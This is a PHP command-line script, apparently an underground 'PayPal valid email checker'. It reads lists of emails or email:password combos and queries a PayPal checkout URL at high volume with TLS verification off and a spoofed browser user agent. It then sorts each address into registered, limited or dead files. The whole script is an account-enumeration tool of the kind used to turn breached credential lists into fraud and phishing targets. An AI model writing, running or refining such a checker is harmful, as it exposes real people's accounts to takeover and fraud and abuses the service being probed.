<?php
// latest update on 19 Mar 2019
// product by ARIE SAGA


ini_set('memory_limit', '1024M');
ob_implicit_flush();
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

$listname = readline("List? ");
$lists = (!($listname) || !file_exists($listname)) ? die("* not found!".PHP_EOL) : file_get_contents($listname);
$lists = explode("\n", str_replace("\r", "", $lists));
$lists = array_unique($lists);
$delim = readline("Delim (fill if the list type is empass)? ");
$delim = !($delim) ? false : $delim;
$savetodir = readline("Save to dir (default: valid)? ");
$savetodir = !($savetodir) ? "valid" : $savetodir;
if(!is_dir($savetodir)) mkdir($savetodir);
chdir($savetodir);
sendemail:
$ratio = readline("Send email per second? ");
$ratio = (!($ratio) || !is_numeric($ratio) || $ratio <= 0) ? 2 : $ratio;
if($ratio > 100) {
	echo "* max 100".PHP_EOL;
	goto sendemail;
}
$delpercheck = readline("Delete list per check (y/n)? ");
$delpercheck = strtolower($delpercheck) == "y" ? true : false;
$no = 0; $total = count($lists); $registered = 0; $die = 0; $limited = 0;
$lists = array_chunk($lists, $ratio);
echo PHP_EOL;

foreach($lists as $clist) {
	$array = $ch = array();
	$mh = curl_multi_init();
	foreach($clist as $i => $list) {
		$no++;
		$email = $list;
		if($delim && preg_match("#".$delim."#", $list)) {
			list($email, $pwd) = explode($delim, $list);
		}
		if(!($email)) { continue; }
		$array[$i]["no"] = $no;
		$array[$i]["list"] = $list;
		$array[$i]["email"] = $email;
		$ch[$i] = curl_init();
		curl_setopt($ch[$i], CURLOPT_URL, "https://history.paypal.com/cgi-bin/webscr?cmd=_xclick&xo_node_fallback=true&force_sa=true&upload=1&rm=2&business=".$email);
		curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch[$i], CURLOPT_HEADER, 0);
		curl_setopt($ch[$i], CURLOPT_COOKIEJAR, dirname(__FILE__)."/../ppval.cook");
		curl_setopt($ch[$i], CURLOPT_COOKIEFILE, dirname(__FILE__)."/../ppval.cook");
		curl_setopt($ch[$i], CURLOPT_SSL_VERIFYPEER, 0);
    	curl_setopt($ch[$i], CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch[$i], CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
		curl_setopt($ch[$i], CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36");
		curl_multi_add_handle($mh, $ch[$i]);
	}
	$active = null;
	do {
		curl_multi_exec($mh, $active);
	} while($active > 0);
	foreach($ch as $i => $c) {
		$no =  $array[$i]["no"];
		$list =  $array[$i]["list"];
		$email =  $array[$i]["email"];
		$x = curl_multi_getcontent($c);
		if(preg_match("#<html lang#", $x)) {
			if(preg_match("#<div id=\"headerSection\"><h2>#", $x)) {
				$limited++;
				file_put_contents("limited.txt", $email.PHP_EOL, FILE_APPEND);
				echo "[".date("H:i:s")." ".$no."/".$total."] ".$email." > ".color()["LW"]."Limited".color()["WH"]; flush();
			}else{
				$registered++;
				file_put_contents("registered.txt", $email.PHP_EOL, FILE_APPEND);
				echo "[".date("H:i:s")." ".$no."/".$total."] ".$email." > ".color()["LG"]."Registered".color()["WH"]; flush();
			}
		}else{
			$die++;
			file_put_contents("die.txt", $email.PHP_EOL, FILE_APPEND);
			echo "[".date("H:i:s")." ".$no."/".$total."] ".$email." > ".color()["LR"]."Die".color()["WH"]; flush();
		}
		if($delpercheck) {
    		$awal = str_replace("\r", "", file_get_contents("../".$listname));
    	   	$akhir = str_replace($list."\n", "", $awal);
    	   	if($no == $total) $akhir = str_replace($list, "", $awal);
    	    file_put_contents("../".$listname, $akhir);
    	}
		echo PHP_EOL;
		curl_multi_remove_handle($mh, $c);
		usleep(1000);
	}
	curl_multi_close($mh);
}
if(!(file_get_contents("../".$listname))) unlink("../".$listname);
echo PHP_EOL."Total: ".$total." - Registered: ".$registered." - Die: ".$die." - Limited: ".$limited.PHP_EOL."Saved to dir \"".$savetodir."\"".PHP_EOL;

function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33;40m" : ""),
		"BB" => (OS == "linux" ? "\e[1;37;44m" : "")
	);
}